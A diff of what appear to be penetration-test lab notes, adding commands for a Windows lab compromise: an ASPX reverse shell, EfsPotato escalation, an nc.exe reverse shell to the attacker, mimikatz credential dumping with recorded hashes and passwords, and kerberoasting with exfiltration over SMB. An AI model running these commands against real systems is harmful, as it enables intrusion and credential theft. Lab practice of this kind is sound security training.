@@ -58,7 +58,52 @@ ftp web_svc@192.168.194.147
 # we discover a wwwroot meaning we can upload files there. from earlier enumeration we realize that this is for the webserver running on 8000 so we upload a shell
 wget https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx
 put shell.aspx
-# we then go catch the shell on 1234 and now it seems we have higher privs including seImpersonate
+# we then go catch the shell on 1234 and now it seems we have higher privs including seImpersonate so we can try some potatoes
 
+cd C:\windows\temp
+iwr -uri http://192.168.45.219/efspotato.cs -Outfile efspotato.cs
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe efspotato.cs
 
+iwr -uri http://192.168.45.219/nc.exe -Outfile nc.exe
+
+.\efspotato.exe whoami
+.\efspotato.exe "nc.exe 192.168.45.219 5555 -e cmd"
+
+```
+
+.147 post exploitation
+```
+iwr -uri http://192.168.45.219:8000/mimikatz.exe -Outfile mimikatz.exe
+. .\mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+lsadump::cache 
+token::elevate
+lsadump::sam
+
+# Administrator - 3c4495bbd678fac8c9d218be4f2bbc7b - December31
+# maybe - IIS - 9194a08e85de5643bd6a4e5c989d169d
+# mary.williams - d9358122015c5b159574a88b3c0d2071 - Freedom1
+# support - d9358122015c5b159574a88b3c0d2071
+
+hashcat -m 1000 mw.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+impacket-smbserver -smb2support smb smb 
+
+# does not connect to ldap
+iwr -uri http://192.168.45.219:8000/SharpHound.ps1 -Outfile SharpHound.ps1
+powershell -ep bypass
+Import-Module .\Sharphound.ps1
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:/windows/temp
+
+net use \\192.168.45.219\smb
+copy 20231206153018_BloodHound.zip \\192.168.45.219\smb
+
+# start bloodhound from kali
+bloodhound
+
+# mysql_service is kerberoastable
+iwr -uri http://192.168.45.219/Rubeus.exe -Outfile Rubeus.exe
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+copy hashes.kerberoast \\192.168.45.219\smb
 ```
